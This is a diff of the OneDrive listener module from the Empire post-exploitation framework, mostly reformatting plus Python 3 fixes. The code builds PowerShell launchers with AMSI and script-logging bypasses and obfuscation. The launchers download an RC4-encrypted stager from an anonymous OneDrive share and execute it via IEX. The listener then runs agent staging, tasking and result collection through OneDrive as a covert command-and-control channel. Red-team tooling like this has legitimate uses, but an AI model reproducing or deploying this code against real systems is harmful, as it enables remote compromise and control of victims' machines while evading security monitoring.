@@ -14,7 +14,7 @@ import json
 from pydispatch import dispatcher
 from requests import Request, Session
 
-#Empire imports
+# Empire imports
 from lib.common import helpers
 from lib.common import agents
 from lib.common import encryption
@@ -22,121 +22,123 @@ from lib.common import packets
 from lib.common import messages
 from lib.common import bypasses
 
+
 class Listener(object):
     def __init__(self, mainMenu, params=[]):
         self.info = {
-                'Name': 'Onedrive',
-                'Author': ['@mr64bit'],
-                'Description': ('Starts a Onedrive listener. Setup instructions here:        gist.github.com/mr64bit/3fd8f321717c9a6423f7949d494b6cd9'),
-                'Category': ('third_party'),
-                'Comments': ["Note that deleting STAGE0-PS.txt from the staging folder will break existing launchers"]
-                }
+            'Name': 'Onedrive',
+            'Author': ['@mr64bit'],
+            'Description': (
+                'Starts a Onedrive listener. Setup instructions here:        gist.github.com/mr64bit/3fd8f321717c9a6423f7949d494b6cd9'),
+            'Category': ('third_party'),
+            'Comments': ["Note that deleting STAGE0-PS.txt from the staging folder will break existing launchers"]
+        }
 
         self.options = {
-            'Name' : {
-                'Description'   :   'Name for the listener.',
-                'Required'      :   True,
-                'Value'         :   'onedrive'
+            'Name': {
+                'Description': 'Name for the listener.',
+                'Required': True,
+                'Value': 'onedrive'
             },
-            'ClientID' : {
-                'Description'   :   'Application ID of the OAuth App.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'ClientID': {
+                'Description': 'Application ID of the OAuth App.',
+                'Required': True,
+                'Value': ''
             },
-            'ClientSecret' : {
-                'Description'   :   'Client secret of the OAuth App.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'ClientSecret': {
+                'Description': 'Client secret of the OAuth App.',
+                'Required': True,
+                'Value': ''
             },
-            'AuthCode' : {
-                'Description'   :   'Auth code given after authenticating OAuth App.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'AuthCode': {
+                'Description': 'Auth code given after authenticating OAuth App.',
+                'Required': True,
+                'Value': ''
             },
-            'BaseFolder' : {
-                'Description'   :   'The base Onedrive folder to use for comms.',
-                'Required'      :   True,
-                'Value'         :   'empire'
+            'BaseFolder': {
+                'Description': 'The base Onedrive folder to use for comms.',
+                'Required': True,
+                'Value': 'empire'
             },
-            'StagingFolder' : {
-                'Description'   :   'The nested Onedrive staging folder.',
-                'Required'      :   True,
-                'Value'         :   'staging'
+            'StagingFolder': {
+                'Description': 'The nested Onedrive staging folder.',
+                'Required': True,
+                'Value': 'staging'
             },
-            'TaskingsFolder' : {
-                'Description'   :   'The nested Onedrive taskings folder.',
-                'Required'      :   True,
-                'Value'         :   'taskings'
+            'TaskingsFolder': {
+                'Description': 'The nested Onedrive taskings folder.',
+                'Required': True,
+                'Value': 'taskings'
             },
-            'ResultsFolder' : {
-                'Description'   :   'The nested Onedrive results folder.',
-                'Required'      :   True,
-                'Value'         :   'results'
+            'ResultsFolder': {
+                'Description': 'The nested Onedrive results folder.',
+                'Required': True,
+                'Value': 'results'
             },
-            'Launcher' : {
-                'Description'   :   'Launcher string.',
-                'Required'      :   True,
-                'Value'         :   'powershell -noP -sta -w 1 -enc '
+            'Launcher': {
+                'Description': 'Launcher string.',
+                'Required': True,
+                'Value': 'powershell -noP -sta -w 1 -enc '
             },
-            'StagingKey' : {
-                'Description'   :   'Staging key for intial agent negotiation.',
-                'Required'      :   True,
-                'Value'         :   'asdf'
+            'StagingKey': {
+                'Description': 'Staging key for intial agent negotiation.',
+                'Required': True,
+                'Value': 'asdf'
             },
-            'PollInterval' : {
-                'Description'   :   'Polling interval (in seconds) to communicate with Onedrive.',
-                'Required'      :   True,
-                'Value'         :   '5'
+            'PollInterval': {
+                'Description': 'Polling interval (in seconds) to communicate with Onedrive.',
+                'Required': True,
+                'Value': '5'
             },
-            'DefaultDelay' : {
-                'Description'   :   'Agent delay/reach back interval (in seconds).',
-                'Required'      :   True,
-                'Value'         :   60
+            'DefaultDelay': {
+                'Description': 'Agent delay/reach back interval (in seconds).',
+                'Required': True,
+                'Value': 10
             },
-            'DefaultJitter' : {
-                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
-                'Required'      :   True,
-                'Value'         :   0.0
+            'DefaultJitter': {
+                'Description': 'Jitter in agent reachback interval (0.0-1.0).',
+                'Required': True,
+                'Value': 0.0
             },
-            'DefaultLostLimit' : {
-                'Description'   :   'Number of missed checkins before exiting',
-                'Required'      :   True,
-                'Value'         :   10
+            'DefaultLostLimit': {
+                'Description': 'Number of missed checkins before exiting',
+                'Required': True,
+                'Value': 10
             },
-            'DefaultProfile' : {
-                'Description'   :   'Default communication profile for the agent.',
-                'Required'      :   True,
-                'Value'         :   "N/A|Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)"
+            'DefaultProfile': {
+                'Description': 'Default communication profile for the agent.',
+                'Required': True,
+                'Value': "N/A|Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)"
             },
-            'KillDate' : {
-                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
-                'Required'      :   False,
-                'Value'         :   ''
+            'KillDate': {
+                'Description': 'Date for the listener to exit (MM/dd/yyyy).',
+                'Required': False,
+                'Value': ''
             },
-            'WorkingHours' : {
-                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
-                'Required'      :   False,
-                'Value'         :   ''
+            'WorkingHours': {
+                'Description': 'Hours for the agent to operate (09:00-17:00).',
+                'Required': False,
+                'Value': ''
             },
-            'RefreshToken' : {
-                'Description'   :   'Refresh token used to refresh the auth token',
-                'Required'      :   False,
-                'Value'         :   ''
+            'RefreshToken': {
+                'Description': 'Refresh token used to refresh the auth token',
+                'Required': False,
+                'Value': ''
             },
-            'RedirectURI' : {
-                'Description'   :   'Redirect URI of the registered application',
-                'Required'      :   True,
-                'Value'         :   "https://login.live.com/oauth20_desktop.srf"
+            'RedirectURI': {
+                'Description': 'Redirect URI of the registered application',
+                'Required': True,
+                'Value': "https://login.live.com/oauth20_desktop.srf"
             },
-            'SlackToken' : {
-                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'SlackToken': {
+                'Description': 'Your SlackBot API token to communicate with your Slack instance.',
+                'Required': False,
+                'Value': ''
             },
-            'SlackChannel' : {
-                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
-                'Required'      :   False,
-                'Value'         :   '#general'
+            'SlackChannel': {
+                'Description': 'The Slack channel or DM that notifications will be sent to.',
+                'Required': False,
+                'Value': '#general'
             }
         }
 
@@ -152,8 +154,9 @@ class Listener(object):
 
         self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]
 
-        #If we don't have an OAuth code yet, give the user a URL to get it
-        if (str(self.options['RefreshToken']['Value']).strip() == '') and (str(self.options['AuthCode']['Value']).strip() == ''):
+        # If we don't have an OAuth code yet, give the user a URL to get it
+        if (str(self.options['RefreshToken']['Value']).strip() == '') and (
+                str(self.options['AuthCode']['Value']).strip() == ''):
             if (str(self.options['ClientID']['Value']).strip() == ''):
                 print(helpers.color("[!] ClientID needed to generate AuthCode URL!"))
                 return False
@@ -161,7 +164,7 @@ class Listener(object):
                       'response_type': 'code',
                       'redirect_uri': self.options['RedirectURI']['Value'],
                       'scope': 'files.readwrite offline_access'}
-            req = Request('GET','https://login.microsoftonline.com/common/oauth2/v2.0/authorize', params = params)
+            req = Request('GET', 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', params=params)
             prep = req.prepare()
             print(helpers.color("[*] Get your AuthCode from \"%s\" and try starting the listener again." % prep.url))
             return False
@@ -173,11 +176,14 @@ class Listener(object):
 
         return True
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
+                          proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         if not language:
             print(helpers.color("[!] listeners/onedrive generate_launcher(): No language specified"))
 
-        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
+        if listenerName and (listenerName in self.threads) and (
+                listenerName in self.mainMenu.listeners.activeListeners):
             listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
             staging_key = listener_options['StagingKey']['Value']
             profile = listener_options['DefaultProfile']['Value']
@@ -190,7 +196,7 @@ class Listener(object):
             results_folder = listener_options['ResultsFolder']['Value']
 
             if language.startswith("power"):
-                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
+                launcher = "$ErrorActionPreference = 'SilentlyContinue';"  # Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
                     launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -204,7 +210,8 @@ class Listener(object):
                     if AMSIBypass2:
                         launcher += bypasses.AMSIBypass2()
                     launcher += "};"
-                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+                    launcher += helpers.randomize_capitalization(
+                        "[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")
 
@@ -220,19 +227,21 @@ class Listener(object):
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
-                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                            launcher += helpers.randomize_capitalization(
+                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
-                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
+                            launcher += helpers.randomize_capitalization("$proxy.Address = '" + proxy.lower() + "';")
                             launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                     if proxyCreds.lower() == "default":
-                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                        launcher += helpers.randomize_capitalization(
+                            "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                     else:
                         username = proxyCreds.split(":")[0]
                         password = proxyCreds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
-                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                        launcher += "$netcred = New-Object System.Net.NetworkCredential('" + usr + "','" + password + "','" + domain + "');"
                         launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                     launcher += "$Script:Proxy = $wc.Proxy;"
@@ -242,7 +251,8 @@ class Listener(object):
                 launcher += ("'%s');" % staging_key)
 
                 # this is the minimized RC4 launcher code from rc4.ps1
-                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                launcher += helpers.randomize_capitalization(
+                    '$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
                 launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
@@ -251,7 +261,8 @@ class Listener(object):
                 launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)
+                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher,
+                                                 obfuscationCommand=obfuscationCommand)
 
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(launcher, launcher_cmd)
@@ -309,14 +320,16 @@ class Listener(object):
                 return helpers.enc_powershell(randomized_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
+                staging_key = staging_key.encode('UTF-8')
+                return RC4IV + encryption.rc4(RC4IV + staging_key, randomized_stager.encode('UTF-8'))
             else:
                 return randomized_stager
 
         else:
             print(helpers.color("[!] Python agent not available for Onedrive"))
 
-    def generate_comms(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
+    def generate_comms(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri,
+                       language=None):
 
         staging_key = listener_options['StagingKey']['Value']
         base_folder = listener_options['BaseFolder']['Value']
@@ -328,7 +341,7 @@ class Listener(object):
             return
 
         if language.lower() == "powershell":
-            #Function to generate a WebClient object with the required headers
+            # Function to generate a WebClient object with the required headers
             token_manager = """
     $Script:TokenObject = @{token="%s";refresh="%s";expires=(Get-Date).addSeconds(3480)};
     $script:GetWebClient = {
@@ -432,7 +445,8 @@ class Listener(object):
 
             return token_manager + post_message + get_message
 
-    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
+    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri,
+                       language=None):
         """
         Generate the agent code
         """
@@ -448,23 +462,27 @@ class Listener(object):
         lost_limit = listener_options['DefaultLostLimit']['Value']
         working_hours = listener_options['WorkingHours']['Value']
         kill_date = listener_options['KillDate']['Value']
-        b64_default_response = base64.b64encode(self.default_response())
+        b64_default_response = base64.b64encode(self.default_response().encode('UTF-8'))
 
         if language == 'powershell':
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language)
+            comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token,
+                                             redirect_uri, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
 
             agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
             agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            agent_code = agent_code.replace(
+                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
+                "$Profile = \"" + str(profile) + "\"")
             agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
-            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')
+            agent_code = agent_code.replace('$DefaultResponse = ""',
+                                            '$DefaultResponse = "' + b64_default_response.decode('UTF-8') + '"')
 
             if kill_date != "":
                 agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")
@@ -488,7 +506,8 @@ class Listener(object):
                 r_token['update'] = True
                 return r_token
             except KeyError as e:
-                print(helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description'])))
+                print(helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (
+                r.status_code, r.json()['error_codes'], r.json()['error_description'])))
                 raise
 
         def renew_token(client_id, client_secret, refresh_token):
@@ -505,7 +524,8 @@ class Listener(object):
                 r_token['update'] = True
                 return r_token
             except KeyError as e:
-                print(helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description'])))
+                print(helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (
+                r.status_code, r.json()['error_codes'], r.json()['error_description'])))
                 raise
 
         def test_token(token):
@@ -528,7 +548,7 @@ class Listener(object):
             else:
                 message = "[*] {} folder already exists".format(base_folder)
                 signal = json.dumps({
-                    'print' : True,
+                    'print': True,
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
@@ -538,46 +558,49 @@ class Listener(object):
                 if not (item_object.status_code == 200):
                     print(helpers.color("[*] Creating %s/%s folder" % (base_folder, item)))
                     params = {'@microsoft.graph.conflictBehavior': 'rename', 'folder': {}, 'name': item}
-                    item_object = s.post("%s/drive/items/%s/children" % (base_url, base_object.json()['id']), json=params)
+                    item_object = s.post("%s/drive/items/%s/children" % (base_url, base_object.json()['id']),
+                                         json=params)
                 else:
                     message = "[*] {}/{} already exists".format(base_folder, item)
                     signal = json.dumps({
-                        'print' : True,
+                        'print': True,
                         'message': message
                     })
                     dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
         def upload_launcher():
-            ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
+            ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
+                                                                  userAgent='none', proxy='none', proxyCreds='none')
 
-            r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
-                        data=ps_launcher, headers={"Content-Type": "text/plain"})
+            r = s.put("%s/drive/root:/%s/%s/%s:/content" % (base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
+                      data=ps_launcher, headers={"Content-Type": "text/plain"})
 
             if r.status_code == 201 or r.status_code == 200:
                 item = r.json()
                 r = s.post("%s/drive/items/%s/createLink" % (base_url, item['id']),
-                            json={"scope": "anonymous", "type": "view"},
-                            headers={"Content-Type": "application/json"})
+                           json={"scope": "anonymous", "type": "view"},
+                           headers={"Content-Type": "application/json"})
                 launcher_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
 
         def upload_stager():
-            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell', token=token['access_token'])
+            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell',
+                                             token=token['access_token'])
             r = s.put("%s/drive/root:/%s/%s/%s:/content" % (base_url, base_folder, staging_folder, "STAGE0-PS.txt"),
-                        data=ps_stager, headers={"Content-Type": "application/octet-stream"})
+                      data=ps_stager, headers={"Content-Type": "application/octet-stream"})
             if r.status_code == 201 or r.status_code == 200:
                 item = r.json()
                 r = s.post("%s/drive/items/%s/createLink" % (base_url, item['id']),
-                            json={"scope": "anonymous", "type": "view"},
-                            headers={"Content-Type": "application/json"})
+                           json={"scope": "anonymous", "type": "view"},
+                           headers={"Content-Type": "application/json"})
                 stager_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
-                #Different domain for some reason?
+                # Different domain for some reason?
                 self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
 
             else:
                 print(helpers.color("[!] Something went wrong uploading stager"))
                 message = r.content
                 signal = json.dumps({
-                    'print' : True,
+                    'print': True,
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
@@ -604,7 +627,7 @@ class Listener(object):
             token = renew_token(client_id, client_secret, refresh_token)
             message = "[*] Refreshed auth token"
             signal = json.dumps({
-                'print' : True,
+                'print': True,
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
@@ -612,7 +635,7 @@ class Listener(object):
             token = get_token(client_id, client_secret, auth_code)
             message = "[*] Got new auth token"
             signal = json.dumps({
-                'print' : True,
+                'print': True,
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/onedrive")
@@ -622,7 +645,7 @@ class Listener(object):
         setup_folders()
 
         while True:
-            #Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
+            # Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
             try:
                 if listener_name in list(self.mainMenu.listeners.activeListeners.keys()):
                     upload_stager()
@@ -635,44 +658,49 @@ class Listener(object):
 
         while True:
             time.sleep(int(poll_interval))
-            try: #Wrap the whole loop in a try/catch so one error won't kill the listener
-                if time.time() > token['expires_at']: #Get a new token if the current one has expired
+            try:  # Wrap the whole loop in a try/catch so one error won't kill the listener
+                if time.time() > token['expires_at']:  # Get a new token if the current one has expired
                     token = renew_token(client_id, client_secret, token['refresh_token'])
                     s.headers['Authorization'] = "Bearer " + token['access_token']
                     message = "[*] Refreshed auth token"
                     signal = json.dumps({
-                        'print' : True,
+                        'print': True,
                         'message': message
                     })
                     dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                     upload_stager()
                 if token['update']:
-                    self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken", token['refresh_token'])
+                    self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken",
+                                                                    token['refresh_token'])
                     token['update'] = False
 
                 search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, staging_folder))
-                for item in search.json()['children']: #Iterate all items in the staging folder
+                for item in search.json()['children']:  # Iterate all items in the staging folder
                     try:
                         reg = re.search("^([A-Z0-9]+)_([0-9]).txt", item['name'])
                         if not reg:
                             continue
                         agent_name, stage = reg.groups()
-                        if stage == '1': #Download stage 1, upload stage 2
-                            message = "[*] Downloading {}/{}/{} {}".format(base_folder, staging_folder, item['name'], item['size'])
+                        if stage == '1':  # Download stage 1, upload stage 2
+                            message = "[*] Downloading {}/{}/{} {}".format(base_folder, staging_folder, item['name'],
+                                                                           item['size'])
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
-                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
-                            message = "[*] Uploading {}/{}/{}_2.txt, {} bytes".format(base_folder, staging_folder, agent_name, str(len(return_val)))
+                            lang, return_val = \
+                            self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
+                            message = "[*] Uploading {}/{}/{}_2.txt, {} bytes".format(base_folder, staging_folder,
+                                                                                      agent_name, str(len(return_val)))
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            s.put("%s/drive/root:/%s/%s/%s_2.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=return_val)
+                            s.put("%s/drive/root:/%s/%s/%s_2.txt:/content" % (
+                            base_url, base_folder, staging_folder, agent_name), data=return_val)
                             message = "[*] Deleting {}/{}/{}".format(base_folder, staging_folder, item['name'])
                             signal = json.dumps({
                                 'print': False,
@@ -681,29 +709,35 @@ class Listener(object):
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
-                        if stage == '3': #Download stage 3, upload stage 4 (full agent code)
-                            message = "[*] Downloading {}/{}/{}, {} bytes".format(base_folder, staging_folder, item['name'], item['size'])
+                        if stage == '3':  # Download stage 3, upload stage 4 (full agent code)
+                            message = "[*] Downloading {}/{}/{}, {} bytes".format(base_folder, staging_folder,
+                                                                                  item['name'], item['size'])
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
-                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
+                            lang, return_val = \
+                            self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
 
                             session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
-                            agent_token = renew_token(client_id, client_secret, token['refresh_token']) #Get auth and refresh tokens for the agent to use
-                            agent_code = str(self.generate_agent(listener_options, client_id, client_secret, agent_token['access_token'],
-                                                            agent_token['refresh_token'], redirect_uri, lang))
+                            agent_token = renew_token(client_id, client_secret, token[
+                                'refresh_token'])  # Get auth and refresh tokens for the agent to use
+                            agent_code = str(self.generate_agent(listener_options, client_id, client_secret,
+                                                                 agent_token['access_token'],
+                                                                 agent_token['refresh_token'], redirect_uri, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
 
-                            message = "[*] Uploading {}/{}/{}_4.txt, {} bytes".format(base_folder, staging_folder, agent_name, str(len(enc_code)))
+                            message = "[*] Uploading {}/{}/{}_4.txt, {} bytes".format(base_folder, staging_folder,
+                                                                                      agent_name, str(len(enc_code)))
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            s.put("%s/drive/root:/%s/%s/%s_4.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=enc_code)
+                            s.put("%s/drive/root:/%s/%s/%s_4.txt:/content" % (
+                            base_url, base_folder, staging_folder, agent_name), data=enc_code)
                             message = "[*] Deleting {}/{}/{}".format(base_folder, staging_folder, item['name'])
                             signal = json.dumps({
                                 'print': False,
@@ -713,7 +747,8 @@ class Listener(object):
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
                     except Exception as e:
-                        print(helpers.color("[!] Could not handle agent staging for listener %s, continuing" % listener_name))
+                        print(helpers.color(
+                            "[!] Could not handle agent staging for listener %s, continuing" % listener_name))
                         message = traceback.format_exc()
                         signal = json.dumps({
                             'print': False,
@@ -722,12 +757,17 @@ class Listener(object):
                         dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
                 agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
-                for agent_id in agent_ids: #Upload any tasks for the current agents
-                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
+
+                for agent_id in agent_ids:  # Upload any tasks for the current agents
+                    if isinstance(agent_id,bytes):
+                        agent_id = agent_id.decode('UTF-8')
+                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key,
+                                                                          update_lastseen=True)
                     if task_data:
                         try:
-                            r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
-                            if r.status_code == 200: # If there's already something there, download and append the new data
+                            r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (
+                            base_url, base_folder, taskings_folder, agent_id))
+                            if r.status_code == 200:  # If there's already something there, download and append the new data
                                 task_data = r.content + task_data
 
                             message = "[*] Uploading agent tasks for {}, {} bytes".format(agent_id, str(len(task_data)))
@@ -736,8 +776,9 @@ class Listener(object):
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            
-                            r = s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = task_data)
+
+                            r = s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (
+                            base_url, base_folder, taskings_folder, agent_id), data=task_data)
                         except Exception as e:
                             message = "[!] Error uploading agent tasks for {}, {}".format(agent_id, e)
                             signal = json.dumps({
@@ -747,32 +788,40 @@ class Listener(object):
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
                 search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, results_folder))
-                for item in search.json()['children']: #For each file in the results folder
+                for item in search.json()['children']:  # For each file in the results folder
                     try:
                         agent_id = item['name'].split(".")[0]
-                        if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
-                            print(helpers.color("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name'])))
-                            s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
+
+                        for i in range(len(agent_ids)):
+                            agent_ids[i] = agent_ids[i].decode('UTF-8')
+
+                        if not agent_id in agent_ids:  # If we don't recognize that agent, upload a message to restage
+                            print(helpers.color(
+                                "[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name'])))
+                            s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (
+                            base_url, base_folder, taskings_folder, agent_id), data="RESTAGE")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
                             continue
 
-                        try: #Update the agent's last seen time, from the file timestamp
+                        try:  # Update the agent's last seen time, from the file timestamp
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
-                        except: #sometimes no ms for some reason...
+                        except:  # sometimes no ms for some reason...
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
                         seen_time = helpers.utc_to_local(seen_time)
                         self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
 
-                        #If the agent is just checking in, the file will only be 1 byte, so no results to fetch
-                        if(item['size'] > 1):
-                            message = "[*] Downloading results from {}/{}, {} bytes".format(results_folder, item['name'], item['size'])
+                        # If the agent is just checking in, the file will only be 1 byte, so no results to fetch
+                        if (item['size'] > 1):
+                            message = "[*] Downloading results from {}/{}, {} bytes".format(results_folder,
+                                                                                            item['name'], item['size'])
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                             r = s.get(item['@microsoft.graph.downloadUrl'])
-                            self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options, update_lastseen=False)
